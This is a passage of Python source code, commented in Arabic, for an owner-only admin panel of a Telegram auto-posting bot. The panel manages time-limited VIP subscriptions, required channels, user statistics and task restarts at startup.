async def Owner(_, __: Client, message: Message):
    return (message.from_user.id == owner )

isOwner = filters.create(Owner)

# تم تعديل لوحة المالك لإضافة زر المشتركين الحاليين
adminMarkup = Markup([
    [
        Button("❌ - الغاء VIP -", callback_data="cancelVIP"),
        Button("✅ - تفعيل VIP -", callback_data="addVIP")
    ],
    [
        Button("👥 - المشتركين الحاليين -", callback_data="currentVIPs")
    ],
    [
        Button("📊 - الاحصائيات -", callback_data="statics"),
        Button("🔗 - قنوات الإشتراك -", callback_data="channels")
    ]
])


@app.on_message(filters.command("admin") & filters.private & isOwner)
@app.on_callback_query(filters.regex("toAdmin") & isOwner)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    if isinstance(message, Message):
        fname = message.from_user.first_name
        func = message.reply
    else:
        fname = message.from_user.first_name
        func = message.message.edit_text

    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
    await func(
        caption,
        reply_markup = adminMarkup,
    )


@app.on_callback_query(filters.regex(r"^(currentVIPs)$") & isOwner)
async def currentVIPs(_: Client, callback: CallbackQuery):
    """
    تعرض قائمة بجميع الأيديات المفعلة VIP حالياً مع الوقت المتبقي لهم.
    """
    vip_info_list = []
    
    # المرور على المستخدمين المفعل لهم VIP (باستثناء المالك نفسه)
    for user_key, user_data in users.items():
        user_id = int(user_key)
        if user_data.get("vip", False) and user_id != owner and user_data.get("limitation"):
            
            # 1. الحصول على اسم المستخدم
            name = user_key # الافتراضي هو الايدي
            try:
                chat = await callback.client.get_chat(user_id)
                name = chat.username or chat.first_name or user_key
            except Exception:
                pass 
            
            # 2. حساب الوقت المتبقي
            rem_time_details = get_remaining_time(user_data)
            
            # 3. حساب الأيام والساعات المتبقية
            days_rem = 0
            time_str = "منتهية"
            
            if rem_time_details and (rem_time_details['hours'] > 0 or rem_time_details['minutes'] > 0): # إذا كان هناك وقت متبقٍ
                limitation = user_data["limitation"]
                end_date_str = limitation["endDate"]
                end_time_str = limitation["endTime"]
                end_datetime_str = f"{end_date_str} {end_time_str}"
                
                try:
                    end_datetime = datetime.strptime(end_datetime_str, "%Y-%m-%d %H:%M")
                    end_datetime = _timezone.localize(end_datetime.replace(tzinfo=None))
                    current_datetime = datetime.now(_timezone)
                    time_remaining_delta = end_datetime - current_datetime
                    
                    # نستخدم total_seconds لحساب الأيام والساعات بدقة
                    total_seconds = int(time_remaining_delta.total_seconds())
                    days_rem = total_seconds // (24 * 3600)
                    
                except ValueError:
                    pass
                
                h = (total_seconds % (24 * 3600)) // 3600 # الساعات المتبقية في اليوم الأخير
                m = (total_seconds % 3600) // 60        # الدقائق المتبقية
                
                # بناء سلسلة الوقت المتبقي
                if days_rem > 0:
                    time_str = f"**{days_rem}**يوم و **{h}**س"
                elif h > 0:
                    time_str = f"**{h}**س و **{m}**د"
                else:
                    time_str = f"**{m}**د"
            
            vip_info_list.append(f"👤 {name} (`{user_key}`)\n- متبقي: {time_str}")

    if not vip_info_list:
        caption = "❌ لا يوجد حالياً أي مشتركين VIP فعالين (باستثناء المالك)."
    else:
        # بناء الرسالة النهائية
        vip_list_str = "\n" + "\n".join(vip_info_list)
        caption = f"**قائمة المشتركين الحاليين (VIP):**\n\n{vip_list_str}"

    markup = Markup([
        [Button("🔙 - العودة للوحة المالك -", callback_data="toAdmin")]
    ])

    await callback.message.edit_text(
        caption,
        reply_markup=markup
    )


@app.on_callback_query(filters.regex("addVIP") & isOwner)
async def addVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("🔙 - الصفحه الرئيسيه -", callback_data="toAdmin")
    ]])
    await callback.message.delete()

    # 1. طلب ايدي المستخدم
    try:
        ask = await listener.listen(
            from_id = user_id,
            chat_id = user_id,
            text = "- ارسل ايدي المستخدم ليتم تفعيل VIP له",
            reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
            timeout = 30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)

    try:
        _id = int(ask.text)
        chat = await app.get_chat(_id) # للتحقق من وجود المستخدم
        target_name = chat.first_name or "مستخدم غير معروف"
    except ValueError:
        return await ask.reply("- هذه البيانات لا يمكن ان تكون ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except:
        return await ask.reply("- لم يتم ايجاد هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)

    # 2. طلب مدة الاشتراك
    try:
        limit = await listener.listen(
            from_id = user_id,
            chat_id = user_id,
            text = "- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
            reply_markup = ForceReply(selective = True, placeholder = "- Days limitation: "),
            reply_to_message_id = ask.id,
            timeout = 30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")

    if limit.text == "/cancel":
        return await limit.reply("- تم إلغاء العملية.", reply_to_message_id=limit.id, reply_markup=reMarkup)

    try:
        _limit = int(limit.text)
        if _limit <= 0: raise ValueError
    except ValueError:
        return await limit.reply("- قيمة المده المتاحه للعضو غير صحيحه (يجب أن تكون عدداً صحيحاً موجباً).", reply_to_message_id=limit.id, reply_markup=reMarkup)

    # 3. تفعيل الاشتراك والحفظ
    vipDate = timeCalc(_limit)
    user_key = str(_id)

    if user_key not in users: users[user_key] = {}

    users[user_key]["vip"] = True
    users[user_key]["limitation"] = {
        "days": _limit,
        "startDate": vipDate["current_date"],
        "endDate": vipDate["end_date"],
        "endTime": vipDate["endTime"],
    }
    write(users_db, users)

    create_task(vipCanceler(_id))

    # حساب الوقت المتبقي لرسالة التفعيل
    # نحتاج إلى كائن datetime كامل لعملية الطرح
    end_dt_time = datetime.strptime(f"{vipDate['end_date']} {vipDate['endTime']}", "%Y-%m-%d %H:%M")
    end_dt_time = _timezone.localize(end_dt_time.replace(tzinfo=None))
    current_dt = datetime.now(_timezone)

    time_remaining_delta = end_dt_time - current_dt

    # تحويل الفرق إلى ساعات ودقائق وثواني
    total_seconds = int(time_remaining_delta.total_seconds())
    hours_rem = total_seconds // 3600
    minutes_rem = (total_seconds % 3600) // 60
    # seconds_rem = total_seconds % 60 # لم نستخدم الثواني في الرسالة

    # 4. إرسال الرسالة
    # رسالة المالك - التعديل المطلوب
    admin_caption = f"""
- تم تفعيل اشتراك VIP جديد الى {target_name}

- معلومات الاشتراك:
- تاريخ البدء: {vipDate['current_date']}
- تاريخ انتهاء الاشتراك: {vipDate['end_date']}

- المده بالأيام: {_limit} من الأيام

- المتبقي من الوقت: {hours_rem} ساعة و {minutes_rem} دقيقة
    """

    # رسالة التفعيل للمستخدم (يمكن تركها كما هي أو تعديلها أيضاً)
    user_caption = f"""
- تم تفعيل الاشتراك الخاص بك في بوت النشر التلقائي

- معلومات الاشتراك :

- تاريخ البدأ : {vipDate['current_date']}
- تاريخ انتهاء الاشتراك : {vipDate['end_date']}

- المدة بالأيام : {_limit}

- الوقت المتبقي لانتهاء الاشتراك : {hours_rem} ساعة و {minutes_rem} دقيقة 

شكراً لاستخدامك بوت النشر التلقائي الخاص بـ {SUPPORT_USERNAME}
    """

    await limit.reply(
        admin_caption,
        reply_markup = reMarkup,
        reply_to_message_id = limit.id
    )

    try:
        await app.send_message(
            chat_id = _id,
            text = user_caption
        )
    except:
        await limit.reply("- اجعل المستخدم يقوم بمراسلة البوت.")


@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
async def cancelVIP(_: Client, callback: CallbackQuery):
    """
    تعرض قائمة بجميع الأيديات المفعلة VIP حالياً مع أزرار للإلغاء.
    """
    vip_users = {}
    # قراءة بيانات المستخدمين المفعل لهم VIP (باستثناء المالك)
    for user_key, user_data in users.items():
        if user_data.get("vip", False) and int(user_key) != owner:
            # محاولة الحصول على اسم المستخدم أو الاسم الأول إن أمكن
            try:
                chat = await app.get_chat(int(user_key))
                # تحديد الاسم: يوزر نيم أولاً، ثم الاسم الأول، ثم "غير معروف"
                name = chat.username or chat.first_name or "مستخدم غير معروف"
            except Exception:
                name = "مستخدم غير معروف"

            vip_users[user_key] = name

    if not vip_users:
        return await callback.answer("- لا يوجد حالياً مستخدمين VIP لتتمكن من الإلغاء.", show_alert=True)

    # إنشاء الأزرار
    markup = []
    for user_id, name in vip_users.items():
        # زر الإلغاء الفعلي
        markup.append([
            Button(f"❌ {name} ({user_id})", callback_data=f"confirmCancelVIP {user_id}")
        ])

    markup.append([
        Button("🔙 - الصفحة الرئيسية -", callback_data="toAdmin")
    ])

    caption = "⚠️ **اختر المستخدم الذي تريد إلغاء اشتراكه:**\n\n**الإيدي - الاسم**"
    await callback.message.edit_text(
        caption,
        reply_markup=Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(confirmCancelVIP)\s(\d+)$") & isOwner)
async def confirmCancelVIP(_: Client, callback: CallbackQuery):
    """
    تأكيد وإلغاء اشتراك VIP للمستخدم المحدد.
    """
    # استخراج الإيدي من الـ callback_data
    target_id = callback.matches[0].group(2)
    user_key = target_id

    if user_key not in users or not users[user_key].get("vip", False):
        await callback.answer("- هذا المستخدم ليس VIP حالياً أو غير موجود.", show_alert=True)
        # العودة إلى قائمة الإلغاء بعد التحديث
        return await cancelVIP(callback.client, callback)

    # تنفيذ الإلغاء
    users[user_key]["vip"] = False
    if users[user_key].get("posting"):
        users[user_key]["posting"] = False
    if "limitation" in users[user_key]:
        users[user_key]["limitation"] = {}

    write(users_db, users)

    # إرسال رسالة للمالك
    try:
        chat = await callback.client.get_chat(int(user_key))
        name = chat.username or chat.first_name or "مستخدم غير معروف"
    except Exception:
        name = "مستخدم غير معروف"

    await callback.answer(f"- تم إلغاء اشتراك المستخدم {name} ({target_id}).", show_alert=True)

    # إرسال رسالة الإلغاء اليدوي للمستخدم
    try:
        await app.send_message(
            int(target_id),
            f"""
- تم انتهاء مدة الاشتراك الخاصة بك !

- لتجديد الاشتراك تواصل مع المـطور

شكراً لاستخدامك بوت النشر التلقائي الخاص بـ {SUPPORT_USERNAME}
            """
        )
    except:
        pass

    # العودة إلى القائمة لتحديثها
    await cancelVIP(callback.client, callback)


@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"

    markup = [
        [
            Button(f"🔗 @{channel}", url=f"t.me/{channel}"),
            Button("🗑️", callback_data=f"removeChannel {channel}")
        ] for channel in channels
    ]

    markup.extend([
        [Button("➕ - إضافة قناه جديده -", callback_data="addChannel")],
        [Button("🔙 - الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])

    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    reMarkup = Markup([[
        Button("🔙 - العوده للقنوات -", callback_data="channels")
    ]])
    await callback.message.delete()

    try:
        ask = await listener.listen(
            from_id = user_id,
            chat_id = user_id,
            text = "- ارسل معرف القناه دون @.",
            reply_markup = ForceReply(selective = True, placeholder = "- channel username: "),
            timeout = 30
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- نفذ وقت استلام المعرف.", reply_markup=reMarkup)

    channel_username = ask.text.strip().replace('@', '')

    try:
        chat = await app.get_chat(f"@{channel_username}")
        if chat.type not in ["channel", "supergroup"]:
            raise Exception("Not a channel or supergroup")
    except:
        return await ask.reply("- لم يتم ايجاد هذه الدردشه أو أنها ليست قناة/سوبر. تأكد من أن البوت مشرف فيها.", reply_to_message_id=ask.id, reply_markup=reMarkup)

    if channel_username not in channels:
        channels.append(channel_username)
        write(channels_db, channels)
        await ask.reply("- تم إضافة القناه الى القائمه.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        await ask.reply("- هذه القناة مضافة بالفعل.", reply_to_message_id=ask.id, reply_markup=reMarkup)


@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]

    if channel not in channels:
        await callback.answer("- هذه القناه غير موجوده بالفعل.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- تم حذف هذه القناه")

    # إعادة بناء القائمة وتحديث الرسالة
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button(f"🔗 @{c}", url=f"t.me/{c}"),
            Button("🗑️", callback_data=f"removeChannel {c}")
        ] for c in channels
    ]
    markup.extend([
        [Button("➕ - إضافة قناه جديده -", callback_data="addChannel")],
        [Button("🔙 - الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])

    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup)
    )


@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    vip = 0
    for user_id in users:
        if users[user_id].get("vip", False):
            vip += 1

    reMarkup = Markup([
        [Button("🔙 - الصفحه الرئيسيه -", callback_data="toAdmin")]
    ])

    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
    await callback.message.edit_text(
        caption,
        reply_markup = reMarkup
    )


"""
## 🚀 وظائف التشغيل والإقلاع
"""

async def reStartPosting():
    """إعادة تشغيل مهام النشر التلقائي للمستخدمين الذين كانوا ينشرون قبل إيقاف البوت."""
    await sleep(30)
    for user_key in users:
        if users[user_key].get("posting"):
            create_task(posting(int(user_key)))


async def reVipTime():
    """إعادة تشغيل مهام إلغاء VIP للمستخدمين الحاليين."""
    for user_key in users:
        user_id = int(user_key)
        if user_id == owner: continue
        if users[user_key].get("vip") and users[user_key].get("limitation"):
            create_task(vipCanceler(user_id))


async def main():
    print("Starting bot...")
    # ربط حلقات الأحداث (Loop) مع العميل (Client)
    app.loop = loop
    await app.start()
    print("Bot started.")

    # تشغيل المهام بعد الإقلاع
    create_task(reStartPosting())
    create_task(reVipTime())

    print("Tasks started. Bot is running. Send /start.")
    await idle()
    print("Bot stopped.")

if __name__=="__main__":
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("Bot shutdown initiated by user.")
    except Exception as e:
        print(f"An error occurred during bot execution: {e}")
